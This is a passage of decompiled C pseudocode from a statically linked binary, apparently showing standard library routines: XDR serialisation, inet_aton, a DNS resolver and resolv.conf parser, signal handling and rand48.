    if ( (**(int (__cdecl ***)(int, int *, int, int))(a2 + 4))(a2, &v4, a1, a1) )
    {
      *a3 = v4;
      return 1;
    }
  }
  else
  {
    if ( *(_DWORD *)a2 < 1u )
      return (*(int (__cdecl **)(int, _DWORD *, int, int))(*(_DWORD *)(a2 + 4) + 4))(a2, a3, a1, a1);
    result = 1;
    if ( *(_DWORD *)a2 == 2 )
      return result;
  }
  return 0;
}

//----- (08056BB4) --------------------------------------------------------
_BOOL4 __cdecl xdr_hyper(int *a1, int *a2)
{
  int v2; // ecx@0
  int v3; // eax@1
  int v4; // et1@2
  int v5; // eax@2
  signed int v6; // edx@2
  int v8; // edx@5
  int v10; // [esp+Ch] [ebp-10h]@2
  int v11; // [esp+10h] [ebp-Ch]@2

  v3 = *a1;
  if ( *a1 )
  {
    if ( v3 != 1 )
      return v3 == 2;
    if ( (*(int (__cdecl **)(int *, int *, int, int))a1[1])(a1, &v11, v2, v2)
      && (*(int (__cdecl **)(int *, int *, int, int))a1[1])(a1, &v10, v8, v8) )
    {
      a2[1] = v11;
      *a2 = 0;
      v6 = 1;
      *a2 |= v10;
      a2[1] = a2[1];
    }
    else
    {
      v6 = 0;
    }
  }
  else
  {
    v4 = *a2;
    v11 = a2[1];
    v10 = *a2;
    v5 = (*(int (__cdecl **)(int *, int *, int, int))(a1[1] + 4))(a1, &v11, v10, v10);
    v6 = 0;
    if ( v5 )
      return (*(int (__cdecl **)(int *, int *, int *, int *))(a1[1] + 4))(a1, &v10, a2, a2) != 0;
  }
  return v6;
}

//----- (08056C70) --------------------------------------------------------
_BOOL4 __usercall xdr_u_hyper@<eax>(int a1@<edx>, int a2@<ecx>, int *a3, int *a4)
{
  int v4; // eax@1
  int v5; // eax@2
  signed int v6; // edx@2
  int v8; // edx@5
  int v10; // [esp+Ch] [ebp-10h]@2
  int v11; // [esp+10h] [ebp-Ch]@2

  v4 = *a3;
  if ( *a3 )
  {
    if ( v4 != 1 )
      return v4 == 2;
    if ( (*(int (__cdecl **)(int *, int *, int, int))a3[1])(a3, &v11, a2, a2)
      && (*(int (__cdecl **)(int *, int *, int, int))a3[1])(a3, &v10, v8, v8) )
    {
      a4[1] = v11;
      *a4 = 0;
      v6 = 1;
      *a4 |= v10;
      a4[1] = a4[1];
    }
    else
    {
      v6 = 0;
    }
  }
  else
  {
    v11 = a4[1];
    v10 = *a4;
    v5 = (*(int (__cdecl **)(int *, int *, int, int))(a3[1] + 4))(a3, &v11, a1, a1);
    v6 = 0;
    if ( v5 )
      return (*(int (__cdecl **)(int *, int *, int *, int *))(a3[1] + 4))(a3, &v10, a4, a4) != 0;
  }
  return v6;
}

//----- (08056D2E) --------------------------------------------------------
int __cdecl xdr_u_short(int a1, _WORD *a2)
{
  int result; // eax@3
  int v3; // [esp+14h] [ebp-8h]@5

  if ( *(_DWORD *)a1 == 1 )
  {
    if ( (**(int (__cdecl ***)(int, int *, signed int, signed int))(a1 + 4))(a1, &v3, 1, 1) )
    {
      *a2 = v3;
      return 1;
    }
  }
  else
  {
    if ( *(_DWORD *)a1 < 1u )
    {
      v3 = (unsigned __int16)*a2;
      return (*(int (__cdecl **)(int, int *, _WORD *, _WORD *))(*(_DWORD *)(a1 + 4) + 4))(a1, &v3, a2, a2);
    }
    result = 1;
    if ( *(_DWORD *)a1 == 2 )
      return result;
  }
  return 0;
}

//----- (08056D92) --------------------------------------------------------
int __cdecl xdr_char(int a1, _BYTE *a2)
{
  int v2; // eax@1
  int v3; // edx@1
  int v5; // [esp+1Ch] [ebp-8h]@1

  v5 = (char)*a2;
  v2 = xdr_int(a1, &v5);
  v3 = 0;
  if ( v2 )
  {
    LOBYTE(v3) = 1;
    *a2 = v5;
  }
  return v3;
}
// 8056B52: using guessed type int __cdecl xdr_int(_DWORD, _DWORD);

//----- (08056DC7) --------------------------------------------------------
int __cdecl xdr_u_char(int a1, _BYTE *a2)
{
  int v2; // eax@1
  int v3; // edx@1
  int v5; // [esp+1Ch] [ebp-8h]@1

  v5 = (unsigned __int8)*a2;
  v2 = xdr_u_int(a1, &v5);
  v3 = 0;
  if ( v2 )
  {
    LOBYTE(v3) = 1;
    *a2 = v5;
  }
  return v3;
}
// 8056BAF: using guessed type int __cdecl xdr_u_int(_DWORD, _DWORD);

//----- (08056DFC) --------------------------------------------------------
int __usercall xdr_bool@<eax>(int a1@<eax>, int a2, _DWORD *a3)
{
  int result; // eax@3
  int v4; // [esp+14h] [ebp-8h]@5

  if ( *(_DWORD *)a2 == 1 )
  {
    if ( (**(int (__cdecl ***)(int, int *, int, int))(a2 + 4))(a2, &v4, a1, a1) )
    {
      *a3 = v4 != 0;
      return 1;
    }
  }
  else
  {
    if ( *(_DWORD *)a2 < 1u )
      return (*(int (__cdecl **)(int, int *, bool, bool))(*(_DWORD *)(a2 + 4) + 4))(a2, &v4, *a3 != 0, *a3 != 0);
    result = 1;
    if ( *(_DWORD *)a2 == 2 )
      return result;
  }
  return 0;
}

//----- (08056E6F) --------------------------------------------------------
int __cdecl xdr_opaque(_DWORD *a1, int a2, int a3)
{
  int v3; // esi@2
  int (__cdecl *v4)(_DWORD *, void *, int); // ecx@10
  void *v6; // [esp+14h] [ebp+8h]@10
  int v7; // [esp+18h] [ebp+Ch]@10

  if ( !a3 )
    return 1;
  v3 = 0;
  if ( a3 & 3 )
  {
    LOWORD(v3) = 4;
    v3 -= a3 & 3;
  }
  if ( *a1 == 1 )
  {
    if ( !(*(int (__cdecl **)(_DWORD *, int, int, signed int))(a1[1] + 8))(a1, a2, a3, 1) )
      return 0;
    if ( v3 )
    {
      v7 = v3;
      v6 = &crud_3318;
      v4 = *(int (__cdecl **)(_DWORD *, void *, int))(a1[1] + 8);
      return v4(a1, v6, v7);
    }
    return 1;
  }
  if ( *a1 < 1u )
  {
    if ( !(*(int (__cdecl **)(_DWORD *, int, int, _DWORD))(a1[1] + 12))(a1, a2, a3, *a1) )
      return 0;
    if ( v3 )
    {
      v7 = v3;
      v6 = &xdr_zero;
      v4 = *(int (__cdecl **)(_DWORD *, void *, int))(a1[1] + 12);
      return v4(a1, v6, v7);
    }
    return 1;
  }
  if ( *a1 == 2 )
    return 1;
  return 0;
}

//----- (08056F0D) --------------------------------------------------------
int __cdecl xdr_union(int a1, _DWORD *a2, int a3, _DWORD *a4, int (__cdecl *a5)(int, int, signed int))
{
  _DWORD *v5; // ebx@1
  int (__cdecl *v6)(int, int, signed int); // ecx@6
  int v8; // [esp+10h] [ebp-14h]@1
  int v9; // [esp+2Ch] [ebp+8h]@4
  signed int v10; // [esp+30h] [ebp+Ch]@4

  v8 = a3;
  v5 = a4;
  if ( !xdr_enum(a1, a2) )
    return 0;
  while ( 1 )
  {
    v6 = (int (__cdecl *)(int, int, signed int))v5[1];
    if ( !v6 )
      break;
    if ( *v5 == *a2 )
    {
      v10 = -1;
      v9 = v8;
      return v6(a1, v9, v10);
    }
    v5 += 2;
  }
  if ( !a5 )
    return 0;
  v10 = -1;
  v9 = v8;
  v6 = a5;
  return v6(a1, v9, v10);
}

//----- (08056F8F) --------------------------------------------------------
int __usercall xdr_string@<eax>(unsigned __int32 a1@<ebp>, _DWORD *a2, const char **a3, unsigned int a4)
{
  char *v4; // ebx@1
  int result; // eax@12
  unsigned int v6; // [esp+Ch] [ebp-10h]@6

  v4 = (char *)*a3;
  if ( !*a2 )
  {
    if ( !v4 )
      return 0;
    goto LABEL_6;
  }
  if ( *a2 == 2 )
  {
    if ( !v4 )
      return 1;
LABEL_6:
    v6 = strlen(*a3);
  }
  if ( !xdr_u_int(a2, &v6) || v6 > a4 )
    return 0;
  if ( *a2 == 1 )
  {
    if ( v6 == -1 )
      return 1;
    if ( !v4 )
    {
      v4 = (char *)malloc(a1, (int)a3, v6 + 1);
      *a3 = v4;
      if ( !v4 )
      {
        fputs(a1, "xdr_string: out of memory\n", stderr);
        return 0;
      }
    }
    v4[v6] = 0;
  }
  else if ( *a2 >= 1u )
  {
    if ( *a2 == 2 )
    {
      free(a1, v4);
      result = 1;
      *a3 = 0;
      return result;
    }
    return 0;
  }
  return xdr_opaque(a2, (int)v4, v6);
}
// 8056BAF: using guessed type int __cdecl xdr_u_int(_DWORD, _DWORD);

//----- (0805706D) --------------------------------------------------------
_BOOL4 __usercall xdr_wrapstring@<eax>(unsigned __int32 a1@<ebp>, _DWORD *a2, const char **a3)
{
  return xdr_string(a1, a2, a3, 0xFFFFFFFF) != 0;
}

//----- (0805708B) --------------------------------------------------------
int __cdecl xdr_bytes(_DWORD *a1, _DWORD **a2, unsigned int *a3, unsigned int a4)
{
  _DWORD *v4; // ebx@1
  unsigned int v5; // esi@2

  v4 = *a2;
  if ( !xdr_u_int(a1, a3) )
    return 0;
  v5 = *a3;
  if ( *a3 > a4 && *a1 != 2 )
    return 0;
  if ( *a1 == 1 )
  {
    if ( !v5 )
      return 1;
    if ( !v4 )
    {
      v4 = (_DWORD *)malloc((off_t)a2, (int)a1, v5);
      *a2 = v4;
      if ( !v4 )
      {
        fputs((off_t)a2, "xdr_bytes: out of memory\n", stderr);
        return 0;
      }
    }
    return xdr_opaque(a1, (int)v4, v5);
  }
  if ( *a1 < 1u )
    return xdr_opaque(a1, (int)v4, v5);
  if ( *a1 != 2 )
    return 0;
  if ( !v4 )
    return 1;
  free((unsigned int)a2, v4);
  *a2 = 0;
  return 1;
}
// 8056BAF: using guessed type int __cdecl xdr_u_int(_DWORD, _DWORD);

//----- (08057152) --------------------------------------------------------
int __cdecl xdr_netobj(_DWORD *a1, int a2)
{
  return xdr_bytes(a1, (_DWORD **)(a2 + 4), (unsigned int *)a2, 0x400u);
}

//----- (08057170) --------------------------------------------------------
int __cdecl xdrmem_create(_DWORD *a1, int a2, int a3, int a4)
{
  int result; // eax@1

  a1[4] = a2;
  *a1 = a4;
  a1[1] = xdrmem_ops;
  a1[3] = a2;
  result = a3;
  a1[5] = a3;
  return result;
}
// 805BD80: using guessed type int (__cdecl *xdrmem_ops[2])(int, int);

//----- (08057194) --------------------------------------------------------
int __cdecl xdrmem_getpos(int a1)
{
  return *(_DWORD *)(a1 + 12) - *(_DWORD *)(a1 + 16);
}

//----- (0805719F) --------------------------------------------------------
int __cdecl xdrmem_setpos(_DWORD *a1, int a2)
{
  int v2; // ebx@1
  int v3; // edx@1
  int v4; // eax@1

  v2 = 0;
  v3 = a1[4] + a2;
  v4 = a1[3] + a1[5];
  if ( v3 <= v4 )
  {
    a1[3] = v3;
    a1[5] = v4 - v3;
    LOBYTE(v2) = 1;
  }
  return v2;
}

//----- (080571C5) --------------------------------------------------------
int __cdecl xdrmem_inline(int a1, unsigned int a2)
{
  int v2; // edx@1
  unsigned int v3; // eax@1

  v2 = 0;
  v3 = *(_DWORD *)(a1 + 20);
  if ( v3 >= a2 )
  {
    v2 = *(_DWORD *)(a1 + 12);
    *(_DWORD *)(a1 + 20) = v3 - a2;
    *(_DWORD *)(a1 + 12) = v2 + a2;
  }
  return v2;
}

//----- (080571E9) --------------------------------------------------------
signed int __cdecl xdrmem_putint32(int a1, unsigned int *a2)
{
  signed int v2; // edx@1
  unsigned int v3; // eax@1
  _DWORD *v4; // edx@2

  v2 = 0;
  v3 = *(_DWORD *)(a1 + 20);
  if ( v3 > 3 )
  {
    v4 = *(_DWORD **)(a1 + 12);
    *(_DWORD *)(a1 + 20) = v3 - 4;
    *v4 = _byteswap_ulong(*a2);
    v2 = 1;
    *(_DWORD *)(a1 + 12) += 4;
  }
  return v2;
}

//----- (08057216) --------------------------------------------------------
signed int __cdecl xdrmem_getint32(int a1, _DWORD *a2)
{
  signed int v2; // edx@1
  unsigned int v3; // eax@1

  v2 = 0;
  v3 = *(_DWORD *)(a1 + 20);
  if ( v3 > 3 )
  {
    *(_DWORD *)(a1 + 20) = v3 - 4;
    *a2 = _byteswap_ulong(**(_DWORD **)(a1 + 12));
    v2 = 1;
    *(_DWORD *)(a1 + 12) += 4;
  }
  return v2;
}

//----- (08057243) --------------------------------------------------------
signed int __cdecl xdrmem_putlong(int a1, unsigned int *a2)
{
  signed int v2; // edx@1
  unsigned int v3; // eax@1
  _DWORD *v4; // edx@2

  v2 = 0;
  v3 = *(_DWORD *)(a1 + 20);
  if ( v3 > 3 )
  {
    v4 = *(_DWORD **)(a1 + 12);
    *(_DWORD *)(a1 + 20) = v3 - 4;
    *v4 = _byteswap_ulong(*a2);
    v2 = 1;
    *(_DWORD *)(a1 + 12) += 4;
  }
  return v2;
}

//----- (08057270) --------------------------------------------------------
signed int __cdecl xdrmem_getlong(int a1, _DWORD *a2)
{
  signed int v2; // edx@1
  unsigned int v3; // eax@1

  v2 = 0;
  v3 = *(_DWORD *)(a1 + 20);
  if ( v3 > 3 )
  {
    *(_DWORD *)(a1 + 20) = v3 - 4;
    *a2 = _byteswap_ulong(**(_DWORD **)(a1 + 12));
    v2 = 1;
    *(_DWORD *)(a1 + 12) += 4;
  }
  return v2;
}

//----- (0805729D) --------------------------------------------------------
signed int __cdecl xdrmem_putbytes(int a1, char *a2, unsigned int a3)
{
  signed int result; // eax@1
  unsigned int v4; // edx@1

  result = 0;
  v4 = *(_DWORD *)(a1 + 20);
  if ( v4 >= a3 )
  {
    *(_DWORD *)(a1 + 20) = v4 - a3;
    memcpy(*(char **)(a1 + 12), a2, a3);
    *(_DWORD *)(a1 + 12) += a3;
    result = 1;
  }
  return result;
}

//----- (080572D5) --------------------------------------------------------
signed int __cdecl xdrmem_getbytes(int a1, char *a2, unsigned int a3)
{
  signed int result; // eax@1
  unsigned int v4; // edx@1

  result = 0;
  v4 = *(_DWORD *)(a1 + 20);
  if ( v4 >= a3 )
  {
    *(_DWORD *)(a1 + 20) = v4 - a3;
    memcpy(a2, *(char **)(a1 + 12), a3);
    *(_DWORD *)(a1 + 12) += a3;
    result = 1;
  }
  return result;
}

//----- (08057310) --------------------------------------------------------
signed int __cdecl inet_aton(char *a1, _DWORD *a2)
{
  char *v2; // ecx@1
  int v3; // esi@2
  int v4; // edi@4
  char v5; // dl@7
  int v6; // ebx@7
  __int16 v7; // ax@7
  signed int result; // eax@15
  signed int v9; // [esp+0h] [ebp-14h]@2

  v2 = a1;
  if ( !a1 )
    return 0;
  v3 = 0;
  v9 = 1;
  while ( v9 <= 4 )
  {
    if ( !(*((_BYTE *)_ctype_b + 2 * *v2) & 8) )
      return 0;
    v4 = 0;
    while ( 1 )
    {
      v5 = *v2;
      v6 = *v2;
      v7 = *((_WORD *)_ctype_b + v6);
      if ( !(v7 & 8) )
        break;
      v4 = 10 * v4 + v6 - 48;
      if ( v4 > 255 )
        return 0;
      ++v2;
    }
    if ( v9 > 3 )
    {
      ++v2;
      if ( v5 && !(v7 & 0x20) )
        return 0;
    }
    else
    {
      if ( v5 != 46 )
        return 0;
      ++v2;
    }
    ++v9;
    v3 = v4 | (v3 << 8);
  }
  result = 1;
  if ( a2 )
  {
    *a2 = _byteswap_ulong(v3);
    result = 1;
  }
  return result;
}
// 8061BE0: using guessed type void *_ctype_b;

//----- (080573A4) --------------------------------------------------------
int __usercall _dns_lookup@<eax>(off_t a1@<ebp>, char *a2, int a3, int a4, int a5, _DWORD *a6, char *a7)
{
  int v7; // eax@1
  _DWORD *v8; // ebp@1
  int v9; // eax@1
  signed int v10; // ebx@8
  int v11; // esi@12
  int v12; // eax@18
  int v13; // ebx@28
  int v14; // ebx@33
  int v15; // esi@33
  int v16; // ebx@37
  _DWORD *v17; // eax@43
  unsigned int v18; // eax@52
  int v19; // ebx@63
  char *v21; // [esp+1Ch] [ebp-E0h]@1
  int v22; // [esp+20h] [ebp-DCh]@23
  signed int fd; // [esp+24h] [ebp-D8h]@5
  char v24; // [esp+2Bh] [ebp-D1h]@37
  unsigned int v25; // [esp+2Ch] [ebp-D0h]@5
  char *v26; // [esp+30h] [ebp-CCh]@9
  int v27; // [esp+34h] [ebp-C8h]@5
  int v28; // [esp+38h] [ebp-C4h]@5
  int v29; // [esp+3Ch] [ebp-C0h]@5
  bool v30; // [esp+43h] [ebp-B9h]@5
  int v31; // [esp+44h] [ebp-B8h]@38
  __int16 v32; // [esp+48h] [ebp-B4h]@24
  int v33; // [esp+54h] [ebp-A8h]@8
  int v34; // [esp+58h] [ebp-A4h]@25
  int v35; // [esp+64h] [ebp-98h]@40
  int v36; // [esp+68h] [ebp-94h]@8
  int v37; // [esp+70h] [ebp-8Ch]@26
  int v38; // [esp+74h] [ebp-88h]@8
  int v39; // [esp+78h] [ebp-84h]@32
  _DWORD *v40; // [esp+84h] [ebp-78h]@38
  int v41; // [esp+88h] [ebp-74h]@51
  int v42; // [esp+94h] [ebp-68h]@52
  char *v43; // [esp+98h] [ebp-64h]@53
  _DWORD *v44; // [esp+A0h] [ebp-5Ch]@43
  _DWORD *v45; // [esp+A4h] [ebp-58h]@43
  _DWORD *v46; // [esp+A8h] [ebp-54h]@43
  unsigned __int16 v47; // [esp+ACh] [ebp-50h]@13
  __int16 v48; // [esp+AEh] [ebp-4Eh]@16
  int v49; // [esp+B0h] [ebp-4Ch]@17
  char v50; // [esp+B4h] [ebp-48h]@13
  char v51; // [esp+C8h] [ebp-34h]@5
  char *v52; // [esp+D8h] [ebp-24h]@12
  int v53; // [esp+DCh] [ebp-20h]@12
  int v54; // [esp+E0h] [ebp-1Ch]@12
  int v55; // [esp+E4h] [ebp-18h]@22
  __int16 v56; // [esp+E8h] [ebp-14h]@22

  v7 = malloc(a1, (int)a7, 0x200u);
  v8 = (_DWORD *)v7;
  v9 = malloc(v7, (int)a7, 0x401u);
  v21 = (char *)v9;
  if ( v8 && v9 && a4 && *a2 )
  {
    v30 = a2[strlen(a2) - 1] == 46;
    pthread_cleanup_push_defer(&v51, (int)pthread_mutex_unlock, (int)&mylock_2);
    pthread_mutex_lock((int)&mylock_2);
    v28 = static_ns % a4;
    LOWORD(v29) = static_id;
    pthread_cleanup_pop_restore((off_t)v8, (int)&v51, 1);
    fd = -1;
    v25 = 0;
    v27 = -1;
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            if ( v25 > 2 )
              goto LABEL_71;
            if ( fd != -1 )
              _libc_close(fd);
            memset(v8, 0, 0x200u);
            memset(&v33, 0, 0x30u);
            v38 = 1;
            v36 = 1;
            v29 = (unsigned __int16)(v29 + 1);
            v33 = v29;
            v10 = _encode_header((int)&v33, v8, 512);
            if ( v10 < 0 )
              goto LABEL_71;
            strncpy(v21, a2, 1025);
            pthread_cleanup_push_defer(&v51, (int)pthread_mutex_unlock, (int)&_resolv_lock);
            pthread_mutex_lock((int)&_resolv_lock);
            v26 = *(char **)(a5 + 4 * v28);
            if ( v27 >= 0 && v27 < _searchdomains )
            {
              strncat(v21, (char *)&unk_805BDA8, 1025);
              strncat(v21, (char *)_searchdomain[v27], 1025);
            }
            pthread_cleanup_pop_restore((off_t)v8, (int)&v51, 1);
            v52 = v21;
            v53 = a3;
            v54 = 1;
            v11 = _encode_question((int)&v52, (int)v8 + v10, 512 - v10);
            if ( v11 < 0 )
              goto LABEL_71;
            v47 = 2;
            if ( inet_pton(10, v26, &v50) > 0 )
              v47 = 10;
            if ( v47 == 10 )
            {
              v48 = 13568;
            }
            else
            {
              v48 = 13568;
              v49 = inet_addr(v26);
            }
            v12 = socket(v47, 2, 17);
            fd = v12;
            if ( v12 >= 0 )
              break;
LABEL_21:
            ++v25;
          }
          if ( _libc_connect(v12, (int)&v47, 28) >= 0 )
            break;
          if ( *(_DWORD *)_errno_location() != 101 )
            goto LABEL_21;
LABEL_65:
          v28 = (v28 + 1) % a4;
          if ( !v28 )
            ++v25;
          v27 = -1;
        }
        _libc_send(fd, (int)v8, v10 + v11, 0);
        v55 = fd;
        v56 = 1;
        if ( (signed int)poll((struct pollfds *)&v55, 1u, 10000) <= 0 )
          goto LABEL_65;
        v22 = _libc_recv(fd, (int)v8, 512, 0);
        if ( v22 > 11 )
        {
          _decode_header((unsigned __int8 *)v8, &v33);
          v32 = v33;
          if ( v33 == v29 )
          {
            if ( v34 )
              break;
          }
        }
LABEL_62:
        if ( v30 )
          goto LABEL_65;
        pthread_cleanup_push_defer(&v51, (int)pthread_mutex_unlock, (int)&_resolv_lock);
        pthread_mutex_lock((int)&_resolv_lock);
        v19 = _searchdomains;
        pthread_cleanup_pop_restore((off_t)v8, (int)&v51, 1);
        if ( v27 >= v19 - 1 )
          goto LABEL_65;
        ++v27;
      }
      if ( v37 != 3 )
      {
        if ( !v37 )
        {
          if ( v39 <= 0 )
          {
            *(_DWORD *)_GI___h_errno_location() = 4;
            goto LABEL_72;
          }
          v14 = 0;
          v15 = 12;
          while ( v14 < v38 )
          {
            ++v14;
            v15 += _length_question((int)v8, v15);
          }
          v16 = 0;
          v24 = 1;
          while ( v16 < v39 && v15 < v22 )
          {
            v31 = _decode_answer((int)v8, v15, v22, (char **)&v40);
            if ( v31 < 0 )
            {
              if ( !v16 || !v35 )
                goto LABEL_62;
              break;
            }
            if ( v24 )
            {
              v44 = (_DWORD *)*((_DWORD *)a7 + 7);
              v45 = (_DWORD *)*((_DWORD *)a7 + 8);
              v46 = (_DWORD *)*((_DWORD *)a7 + 9);
              memcpy(a7, (char *)&v40, 0x28u);
              v17 = (_DWORD *)*((_DWORD *)a7 + 1);
              if ( v17 != (_DWORD *)24 && (!*((_DWORD *)a7 + 7) || a3 != 1 && a3 != 28) )
                break;
              if ( v17 == (_DWORD *)a3 )
              {
                *((_DWORD *)a7 + 9) = v39 + ~v16;
                if ( (unsigned int)(*((_DWORD *)a7 + 9) * (*((_DWORD *)a7 + 4) + 4)) > *((_DWORD *)a7 + 8) )
                  break;
                *((_DWORD *)a7 + 9) = 0;
                v24 = 0;
              }
              else
              {
                free((unsigned int)v8, *(_DWORD **)a7);
              }
            }
            else
            {
              free((unsigned int)v8, v40);
              if ( v41 == a3 )
              {
                v18 = *((_DWORD *)a7 + 4);
                if ( v18 != v42 )
                {
                  free((unsigned int)v8, *(_DWORD **)a7);
                  goto LABEL_62;
                }
                memcpy((char *)(*((_DWORD *)a7 + 7) + *((_DWORD *)a7 + 9) * v18), v43, v18);
                ++*((_DWORD *)a7 + 9);
              }
            }
            v15 += v31;
            ++v16;
          }
          _libc_close(fd);
          if ( a6 )
            *a6 = v8;
          else
            free((unsigned int)v8, v8);
          free((unsigned int)v8, v21);
          pthread_cleanup_push_defer(&v51, (int)pthread_mutex_unlock, (int)&mylock_2);
          pthread_mutex_lock((int)&mylock_2);
          static_ns = v28;
          static_id = v32;
          pthread_cleanup_pop_restore((off_t)v8, (int)&v51, 1);
          return v22;
        }
        goto LABEL_62;
      }
      if ( v30
        || (pthread_cleanup_push_defer(&v51, (int)pthread_mutex_unlock, (int)&_resolv_lock),
            pthread_mutex_lock((int)&_resolv_lock),
            v13 = _searchdomains,
            pthread_cleanup_pop_restore((off_t)v8, (int)&v51, 1),
            v27 >= v13 - 1) )
      {
        *(_DWORD *)_GI___h_errno_location() = 1;
        goto LABEL_72;
      }
      ++v27;
      LOWORD(v29) = v32;
    }
  }
  fd = -1;
  v28 = -1;
  LOWORD(v29) = -1;
LABEL_71:
  *(_DWORD *)_GI___h_errno_location() = -1;
  v32 = v29;
LABEL_72:
  if ( fd != -1 )
    _libc_close(fd);
  free((unsigned int)v8, v21);
  free((unsigned int)v8, v8);
  v22 = -1;
  if ( v28 != -1 )
  {
    pthread_cleanup_push_defer(&v51, (int)pthread_mutex_unlock, (int)&mylock_2);
    pthread_mutex_lock((int)&mylock_2);
    static_ns = v28;
    static_id = v32;
    pthread_cleanup_pop_restore((off_t)v8, (int)&v51, 1);
    v22 = -1;
  }
  return v22;
}
// 8061C04: using guessed type __int16 static_id;
// 806A5B8: using guessed type int static_ns;
// 806AA64: using guessed type int _searchdomains;

//----- (08057AF8) --------------------------------------------------------
int __usercall _open_nameservers@<eax>(unsigned int *a1@<ebp>)
{
  char *v1; // ebx@5
  char v2; // cl@6
  char v3; // cl@13
  char v4; // cl@18
  unsigned __int8 *v5; // edi@24
  signed int v6; // esi@24
  char *v7; // eax@26
  int v8; // ebx@28
  signed int v9; // esi@34
  char *v10; // eax@35
  int v11; // ebx@37
  signed int v13; // [esp+18h] [ebp-C4h]@9
  char v14; // [esp+28h] [ebp-B4h]@38
  int v15[5]; // [esp+A8h] [ebp-34h]@11
  char v16; // [esp+BCh] [ebp-20h]@1

  pthread_cleanup_push_defer(&v16, (int)pthread_mutex_unlock, (int)&_resolv_lock);
  pthread_mutex_lock((int)&_resolv_lock);
  if ( _nameservers <= 0 )
  {
    a1 = (unsigned int *)fopen("/etc/resolv.conf", (int)"r");
    if ( a1 || (a1 = (unsigned int *)fopen("/etc/config/resolv.conf", (int)"r")) != 0 )
    {
LABEL_38:
      while ( 1 )
      {
        v1 = &v14;
        if ( !fgets((off_t)a1, &v14, 128, a1) )
          break;
        while ( 1 )
        {
          v2 = *v1;
          if ( !*v1 )
            break;
          if ( !(*((_BYTE *)_ctype_b + 2 * v2) & 0x20) )
          {
            if ( v2 != 10 )
            {
              v13 = 0;
              if ( v2 != 35 )
              {
                while ( *v1 && v13 <= 4 )
                {
                  v15[v13] = (int)v1;
                  while ( 1 )
                  {
                    v3 = *v1;
                    if ( !*v1 || *((_BYTE *)_ctype_b + 2 * v3) & 0x20 || v3 == 10 )
                      break;
                    ++v1;
                  }
                  while ( 1 )
                  {
                    v4 = *v1;
                    if ( !*v1 || !(*((_BYTE *)_ctype_b + 2 * v4) & 0x20) && v4 != 10 )
                      break;
                    *v1++ = 0;
                  }
                  ++v13;
                }
                v5 = (unsigned __int8 *)v15[0];
                v6 = 1;
                if ( !strcoll((unsigned __int8 *)v15[0], "nameserver") )
                {
                  while ( v6 < v13 )
                  {
                    v8 = _nameservers;
                    if ( _nameservers > 2 )
                      break;
                    v7 = strdup((off_t)a1, (char *)v15[v6++]);
                    _nameserver[v8] = (int)v7;
                    _nameservers = v8 + 1;
                  }
                }
                if ( !strcoll(v5, "domain") || !strcoll(v5, "search") )
                {
                  while ( _searchdomains > 0 )
                  {
                    free((unsigned int)a1, (_DWORD *)_searchdomain[--_searchdomains]);
                    _searchdomain[_searchdomains] = 0;
                  }
                  v9 = 1;
                  while ( v9 < v13 )
                  {
                    v11 = _searchdomains;
                    if ( _searchdomains > 3 )
                      break;
                    v10 = strdup((off_t)a1, (char *)v15[v9++]);
                    _searchdomain[v11] = (int)v10;
                    _searchdomains = v11 + 1;
                  }
                }
              }
            }
            goto LABEL_38;
          }
          ++v1;
        }
      }
      fclose((int)a1);
    }
    else
    {
      *(_DWORD *)_GI___h_errno_location() = 3;
    }
  }
  return pthread_cleanup_pop_restore((off_t)a1, (int)&v16, 1);
}
// 8061BE0: using guessed type void *_ctype_b;
// 806AA54: using guessed type int _nameserver[];
// 806AA60: using guessed type int _nameservers;
// 806AA64: using guessed type int _searchdomains;
// 8057AF8: using guessed type int var_34[5];

//----- (08057D3C) --------------------------------------------------------
signed int __cdecl _get_hosts_byname_r(unsigned __int8 *a1, int a2, _DWORD *a3, int a4, unsigned int a5, _DWORD *a6, _DWORD *a7)
{
  return _read_etc_hosts_r(0, a1, a2, 0, a3, a4, a5, a6, a7);
}

//----- (08057D68) --------------------------------------------------------
signed int __cdecl signal(int a1, int a2)
{
  signed int i; // eax@5
  int v4; // [esp+10h] [ebp-11Ch]@9
  int v5; // [esp+9Ch] [ebp-90h]@5
  int v6[32]; // [esp+A0h] [ebp-8Ch]@6
  int v7; // [esp+120h] [ebp-Ch]@9

  if ( a2 != -1 && a1 > 0 && a1 <= 64 )
  {
    v5 = a2;
    for ( i = 32; --i >= 0; v6[i] = 0 )
      ;
    if ( _sigaddset((int)v6, a1) >= 0 )
    {
      v7 = (unsigned int)_sigismember((int)&sigintr, a1) < 1 ? 0x10000000 : 0;
      if ( sigaction(a1, (char *)&v5, &v4) >= 0 )
        return v4;
    }
  }
  else
  {
    *(_DWORD *)_errno_location() = 22;
  }
  return -1;
}
// 8057D68: using guessed type int var_8C[32];

//----- (08057E18) --------------------------------------------------------
signed int __cdecl lrand48_r(unsigned __int16 *a1, int *a2)
{
  return nrand48_r(a1, (int)a1, a2);
}

//----- (08057E30) --------------------------------------------------------
signed int __cdecl nrand48_r(unsigned __int16 *a1, int a2, int *a3)
{
  int v3; // eax@1
  signed int v4; // edx@1

  v3 = _drand48_iterate(a1, a2);
  v4 = -1;
  if ( v3 >= 0 )
  {
    *a3 = (a1[1] >> 1) | (a1[2] << 15);
    v4 = 0;
  }
  return v4;
}

//----- (08057E70) --------------------------------------------------------
int __cdecl srand48_r(int a1, int a2)
{
  int result; // eax@1

  *(_WORD *)(a2 + 2) = a1;
  result = 0;
  *(_WORD *)(a2 + 4) = HIWORD(a1);
  *(_WORD *)a2 = 13070;
  *(_DWORD *)(a2 + 16) = -554899859;
  *(_DWORD *)(a2 + 20) = 5;
  *(_WORD *)(a2 + 12) = 11;
  *(_WORD *)(a2 + 14) = 1;
  return result;
}

//----- (08057EA8) --------------------------------------------------------
void __usercall _exit_handler(int a1@<ecx>, unsigned int a2@<ebp>, int a3)
{
  int v3; // eax@2
  _DWORD *v4; // eax@2
  void (__cdecl *v5)(int, _DWORD, int, int); // edx@5
  void (__cdecl *v6)(_DWORD, int, int, int); // edx@7
  int v7; // [esp-Ch] [ebp-18h]@0
  int v8; // [esp-8h] [ebp-14h]@0
  int v9; // [esp-4h] [ebp-10h]@0

  while ( _exit_count )
  {
    v3 = _exit_count - 1;
    _exit_count = v3;
    v4 = (_DWORD *)(_exit_function_table + 16 * v3);
    if ( *v4 == 2 )
    {
      v5 = (void (__cdecl *)(int, _DWORD, int, int))v4[1];
      if ( v5 )
        v5(a3, v4[2], a1, a1);
    }
    else if ( *v4 == 3 )
    {
